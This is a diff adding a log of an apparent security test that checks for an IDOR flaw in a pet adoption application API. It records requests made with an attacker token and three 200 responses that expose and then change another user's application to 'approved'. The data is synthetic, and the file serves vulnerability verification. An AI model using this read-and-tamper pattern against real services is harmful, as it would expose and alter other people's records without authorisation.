@@ -1,0 +1,44 @@
+# IDOR B - read/modify another user's adoption application
+# Attempted: GET/PUT /api/adoptionform/:id and GET /all with ATTACKER token
+# Expected when fixed: 403 for others' records; /all admin-only
+
+# victim application id: 6ab8b704b532676661937427
+
+## (1) GET victim application by id (attacker token):
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Content-Type: application/json; charset=utf-8
+Content-Length: 391
+ETag: W/"187-g1qtIyDCtLwd4UvVEcn/S7QiHqE"
+Date: Sun, 27 Sep 2026 06:26:12 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"_id":"6ab8b704b532676661937427","firstName":"Victim","lastName":"Person","email":"idor_victim@example.com","phoneNumber":"0720000001","petType":"Dog","petName":"Rex","homeType":"House","employmentStatus":"Employed","hasYard":true,"hasOtherPets":false,"additionalInfo":"private notes","status":"pending","createdAt":"2026-09-27T06:26:12.014Z","updatedAt":"2026-09-27T06:26:12.014Z","__v":0}
+
+## (2) GET /all applications (attacker token):
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Content-Type: application/json; charset=utf-8
+Content-Length: 393
+ETag: W/"189-lTHMnwtTcJFZLAIXknVTFb39h9A"
+Date: Sun, 27 Sep 2026 06:26:12 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+[{"_id":"6ab8b704b532676661937427","firstName":"Victim","lastName":"Person","email":"idor_victim@example.com","phoneNumber":"0720000001","petType":"Dog","petName":"Rex","homeType":"House","employmentStatus":"Employed","hasYard":true,"hasOtherPets":false,"additionalInfo":"private notes","status":"pending","createdAt":"2026-09-27T06:26:12.014Z","updatedAt":"2026-09-27T06:26:12.014Z","__v":0}]
+
+## (3) PUT tamper victim application -> status approved (attacker token):
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Content-Type: application/json; charset=utf-8
+Content-Length: 387
+ETag: W/"183-L/W97o/5pNAV+m/sNTkGkc5Dnac"
+Date: Sun, 27 Sep 2026 06:26:12 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"_id":"6ab8b704b532676661937427","firstName":"Victim","lastName":"Person","email":"idor_victim@example.com","phoneNumber":"0720000001","petType":"Dog","petName":"Rex","homeType":"House","employmentStatus":"Employed","hasYard":true,"hasOtherPets":false,"additionalInfo":"HIJACKED","status":"approved","createdAt":"2026-09-27T06:26:12.014Z","updatedAt":"2026-09-27T06:26:12.298Z","__v":0}
